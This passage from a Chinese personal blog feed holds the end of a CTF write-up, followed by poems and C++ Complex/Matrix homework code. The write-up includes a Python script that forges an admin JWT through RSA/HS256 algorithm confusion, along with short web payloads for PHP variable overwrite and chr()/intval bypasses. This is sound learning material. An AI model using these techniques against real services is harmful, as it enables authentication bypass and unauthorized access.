class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getpubkey</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;md5(username+password)&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问拿到自己的pubkey，写脚本构造jwt<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">public=<span class="string">"-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----"</span></span><br><span class="line">print(jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"chenxiyuan"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiY2hlbnhpeXVhbiIsInByaXYiOiJhZG1pbiJ9.3tR0nOjSaz701Z42jmUVRsToZBLy_S-8VoMXktVFQBk'</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p><p>携带新的jwt访问list，得到admin信息<br><img src="http://i2.tiimg.com/665720/932586de6de01b09.png" alt="Markdown"><br>访问text/admin:22f1e0aa7a31422ad63480aa27711277，得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;web1&quot;&gt;&lt;a href=&quot;#web1&quot; class=&quot;headerlink&quot; title=&quot;web1&quot;&gt;&lt;/a&gt;web1&lt;/h2&gt;&lt;p&gt;这个涨姿势，chr()函数是模256，在原数加256即可绕过，intval可以用科学计数法绕过，payload如下&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;password=2e5&amp;amp;value[]=375&amp;amp;value[]=307&amp;amp;value[]=364&amp;amp;value[]=355&amp;amp;value[]=304&amp;amp;value[]=365&amp;amp;value[]=357&amp;amp;value[]=351&amp;amp;value[]=340&amp;amp;value[]=367&amp;amp;value[]=351&amp;amp;value[]=329&amp;amp;value[]=339&amp;amp;value[]=323&amp;amp;value[]=323&amp;amp;value[]=306&amp;amp;value[]=304&amp;amp;value[]=305&amp;amp;value[]=313&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;web2&quot;&gt;&lt;a href=&quot;#web2&quot; class=&quot;headerlink&quot; title=&quot;web2&quot;&gt;&lt;/a&gt;web2&lt;/h2&gt;&lt;p&gt;这题拿到了一血，因为我一发入魂，直接猜到996，果然ctf需要一点脑洞（联系到之前的996事件）。&lt;br&gt;可以用burp，删除cookie和user_code就能暴力破解过验证码了。&lt;/p&gt;
&lt;h2 id=&quot;web3&quot;&gt;&lt;a href=&quot;#web3&quot; class=&quot;headerlink&quot; title=&quot;web3&quot;&gt;&lt;/a&gt;web3&lt;/h2&gt;&lt;p&gt;这题是sql-libs原题，二次注入。&lt;/p&gt;
&lt;h2 id=&quot;web4&quot;&gt;&lt;a href=&quot;#web4&quot; class=&quot;headerlink&quot; title=&quot;web4&quot;&gt;&lt;/a&gt;web4&lt;/h2&gt;&lt;p&gt; parse_str()把查询字符串解析到变量中,存在变量覆盖，payload如下&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;action=auth&amp;amp;key=1&amp;amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>诗</title>
    <link href="http://chenxiyuan.vip/2019/05/21/%E8%AF%97/"/>
    <id>http://chenxiyuan.vip/2019/05/21/诗/</id>
    <published>2019-05-21T07:52:53.000Z</published>
    <updated>2019-05-28T03:08:10.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。"><a href="#这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。" class="headerlink" title="这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。"></a>这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。</h1><h2 id="鹳雀楼"><a href="#鹳雀楼" class="headerlink" title="鹳雀楼"></a>鹳雀楼</h2><p>雄伟镇中州，三朝暗淡收。<br>而今强复起，屹立更千秋。<br><a id="more"></a></p><h2 id="踏青"><a href="#踏青" class="headerlink" title="踏青"></a>踏青</h2><p>西郊院外花争艳，千万红黄聚簇开。<br>惊诧清香何处觅，池莲衣素送风来。</p><h2 id="赠友人"><a href="#赠友人" class="headerlink" title="赠友人"></a>赠友人</h2><p>风流如我辈，分袂亦欣然。<br>草甸观星笑，茅庐试弈谈。<br>啸歌传四海，吟咏共婵娟。<br>会有重逢日，飞花再纵欢。  </p><h2 id="春夜闲适有感"><a href="#春夜闲适有感" class="headerlink" title="春夜闲适有感"></a>春夜闲适有感</h2><p>庭前闲扫晚飞樱，又见嫣红轻舞盈。<br>身惹霞阵全不厌，抬头更看两三星。  </p><h2 id="咏于谦"><a href="#咏于谦" class="headerlink" title="咏于谦"></a>咏于谦</h2><p>为立生民命，功争日月光。<br>先生冤惨死，黯淡九州伤。</p><h2 id="记语文老师"><a href="#记语文老师" class="headerlink" title="记语文老师"></a>记语文老师</h2><p>腰柳亭如立，蹁跹步送春。<br>飘然温细语，引我入知门。</p><h2 id="念奴娇"><a href="#念奴娇" class="headerlink" title="念奴娇"></a>念奴娇</h2><p>仰观中条，尽峰峦逼仄，连冈叠嶂。飞瀑腾冲平断壁，天际远衔横浪。漫步山间，绝巘怪柏，惊有千般样。穿石风瑟，黯然伤过往。<br>倭寇谋略中原，欲从此入，好个修罗场。火炮纷飞砸裂谷，鲜血浸染残阳。也持剑护，杀贼三万，再把黄河唱。乘龙直上，斩碎一切虚妄。  </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。&quot;&gt;&lt;a href=&quot;#这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。&quot; class=&quot;headerlink&quot; title=&quot;这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。&quot;&gt;&lt;/a&gt;这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。&lt;/h1&gt;&lt;h2 id=&quot;鹳雀楼&quot;&gt;&lt;a href=&quot;#鹳雀楼&quot; class=&quot;headerlink&quot; title=&quot;鹳雀楼&quot;&gt;&lt;/a&gt;鹳雀楼&lt;/h2&gt;&lt;p&gt;雄伟镇中州，三朝暗淡收。&lt;br&gt;而今强复起，屹立更千秋。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chenxiyuan.vip/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="诗" scheme="http://chenxiyuan.vip/tags/%E8%AF%97/"/>
    
  </entry>
  
  <entry>
    <title>c++多态性</title>
    <link href="http://chenxiyuan.vip/2019/05/13/c-%E5%A4%9A%E6%80%81%E6%80%A7/"/>
    <id>http://chenxiyuan.vip/2019/05/13/c-多态性/</id>
    <published>2019-05-13T08:35:52.000Z</published>
    <updated>2019-05-13T08:43:06.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="南邮关于c-多态性的上机题，写的时候还是遇到了很多问题的。"><a href="#南邮关于c-多态性的上机题，写的时候还是遇到了很多问题的。" class="headerlink" title="南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。"></a>南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>定义复数类Complex，有实部、虚部两个私有成员变量，在该类中定义多个重载的构造函数、定义析构函数和输出函数print，复数的输出形如12-3i，在类中重载+、−、*、/、++（分前++和后++）。在主函数（直接用实验教材P210代码）中定义复数类的对象，实现复数的各种算术运算，通过重载实现静态多态性。<br><a id="more"></a><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">float</span> real;</span><br><span class="line"><span class="keyword">float</span> imag;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Complex(<span class="keyword">float</span> r=<span class="number">0</span>,<span class="keyword">float</span> i=<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">friend</span> Complex <span class="keyword">operator</span> + (<span class="keyword">const</span> Complex &amp;a,<span class="keyword">const</span> Complex &amp;b);</span><br><span class="line"><span class="keyword">friend</span> Complex <span class="keyword">operator</span> - (<span class="keyword">const</span> Complex &amp;a,<span class="keyword">const</span> Complex &amp;b);</span><br><span class="line"><span class="keyword">friend</span> Complex <span class="keyword">operator</span> ++ (Complex &amp;a);</span><br><span class="line">Complex <span class="keyword">operator</span> ++ (<span class="keyword">int</span>);</span><br><span class="line">Complex <span class="keyword">operator</span> * (<span class="keyword">const</span> Complex &amp;b);</span><br><span class="line">Complex <span class="keyword">operator</span> / (<span class="keyword">const</span> Complex &amp;b);</span><br><span class="line">&#125;;</span><br><span class="line">Complex::Complex(<span class="keyword">float</span> r,<span class="keyword">float</span> i)</span><br><span class="line">&#123;</span><br><span class="line">real=r;</span><br><span class="line">imag=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Complex::print()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;real;</span><br><span class="line"><span class="keyword">if</span>(imag!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(imag&gt;<span class="number">0</span>)<span class="built_in">cout</span>&lt;&lt;<span class="string">"+"</span>;<span class="built_in">cout</span>&lt;&lt;imag&lt;&lt;<span class="string">"i"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">Complex <span class="keyword">operator</span> + (<span class="keyword">const</span> Complex &amp;a,<span class="keyword">const</span> Complex &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">Complex temp;</span><br><span class="line">temp.real=a.real+b.real;</span><br><span class="line">temp.imag=a.imag+b.imag;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">Complex <span class="keyword">operator</span> - (<span class="keyword">const</span> Complex &amp;a,<span class="keyword">const</span> Complex &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">Complex temp;</span><br><span class="line">temp.real=a.real-b.real;</span><br><span class="line">temp.imag=a.imag-b.imag;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">Complex <span class="keyword">operator</span> ++(Complex &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">++a.real;</span><br><span class="line">++a.imag;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Complex Complex::<span class="keyword">operator</span> ++ (<span class="keyword">int</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">Complex <span class="title">temp</span><span class="params">(*<span class="keyword">this</span>)</span></span>;</span><br><span class="line">real++;</span><br><span class="line">imag++;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">Complex Complex::<span class="keyword">operator</span> * (<span class="keyword">const</span> Complex &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">Complex temp;</span><br><span class="line">temp.real=<span class="keyword">this</span>-&gt;real*b.real-<span class="keyword">this</span>-&gt;imag*b.imag;</span><br><span class="line">temp.imag=<span class="keyword">this</span>-&gt;real*b.imag+<span class="keyword">this</span>-&gt;imag*b.real;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Complex Complex::<span class="keyword">operator</span> / (<span class="keyword">const</span> Complex &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">Complex temp;</span><br><span class="line">temp.real=(<span class="keyword">this</span>-&gt;real*b.real+<span class="keyword">this</span>-&gt;imag*b.imag)/(b.real*b.real+b.imag*b.imag);</span><br><span class="line">temp.imag=(<span class="keyword">this</span>-&gt;imag*b.real-<span class="keyword">this</span>-&gt;real*b.imag)/(b.real*b.real+b.imag*b.imag);</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Complex A1(2.3,4.6),A2(3.6,2.8);</span><br><span class="line">Complex A3,A4,A5,A6;</span><br><span class="line">A3=A1+A2;</span><br><span class="line">A4=A1-A2;</span><br><span class="line">A5=A1*A2;</span><br><span class="line">A6=A1/A2;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A1="</span>;</span><br><span class="line">A1.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A2="</span>;</span><br><span class="line">A2.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A3=A1+A2="</span>;</span><br><span class="line">A3.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A4=A1-A2="</span>;</span><br><span class="line">A4.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A5=A1*A2="</span>;</span><br><span class="line">A5.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A6=A1/A2="</span>;</span><br><span class="line">A6.print();</span><br><span class="line">A3=++A1;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"after A3=++A1"</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A1="</span>;</span><br><span class="line">A1.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A3="</span>;</span><br><span class="line">A3.print();</span><br><span class="line">A4=A2++;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"after A4=A2++"</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A2="</span>;</span><br><span class="line">A2.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A4="</span>;</span><br><span class="line">A4.print();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>设计一个矩阵类，要求矩阵类中重载运算符加（＋）和赋值（＝），主函数定义类对象并调用重载的运算符。</p><p>提示： (1) 本题考虑可加（即加与被加矩阵的行列数必须分别相等）和可赋值（等号左值的行列数变为右值的行列数）情况，其他情况输出“ program terminated! ”<br>(2) 要求分别输入矩阵 am 和 bm 的行列数，各矩阵元素，分别计算 cm=am+bm;am=bm; 并进行输出<br>(3) 定义相应的构造函数和析构函数<br>(4) 类中的成员变量应当有三个：int row,co请动态空间，存放row*col个整数<br>(5) 程l;分别表示矩阵的行数和列数，另外还需要定义一个一级指针或二级指针用来申序最前面的文件包含请用下面代码：</p><p>#include <iostream></iostream></p><p>#include &lt;stdlib.h&gt;<br>using namespace std;<br>(6)main()已给出，请直接复制使用<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> row_a,col_a,row_b,col_b;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入am矩阵的行数和列数:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;row_a&gt;&gt;col_a;</span><br><span class="line"><span class="function">Matrix <span class="title">am</span><span class="params">(row_a,col_a)</span></span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入bm矩阵的行数和列数:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;row_b&gt;&gt;col_b;</span><br><span class="line">Matrix bm(row_b,col_b),cm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"am:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">am.disp();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">bm.disp();</span><br><span class="line">cm=am+bm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"cm=am+bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">cm.disp();</span><br><span class="line">am=bm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"am=bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">am.disp();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>(7)类的成员函数disp的代码已给出，请直接复制使用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Matrix::disp()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;row;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">'\t'</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;col;j++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;*(m+i*col+j)&lt;&lt;<span class="string">'\t'</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后代码<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Matrix</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> *m;</span><br><span class="line"><span class="keyword">int</span> row;</span><br><span class="line"><span class="keyword">int</span> col;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Matrix(<span class="keyword">int</span> r=<span class="number">0</span>,<span class="keyword">int</span> c=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">row=r;</span><br><span class="line">col=c;</span><br><span class="line">m= <span class="keyword">new</span> <span class="keyword">int</span>[row*col];</span><br><span class="line"><span class="keyword">if</span>(row!=<span class="number">0</span>&amp;&amp;col!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入该矩阵元素:"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;r*c;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;*(m+i);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~Matrix()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> [] m; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;row;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">'\t'</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;col;j++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;*(m+i*col+j)&lt;&lt;<span class="string">'\t'</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">friend</span> Matrix <span class="keyword">operator</span> + ( <span class="keyword">const</span> Matrix &amp;A, <span 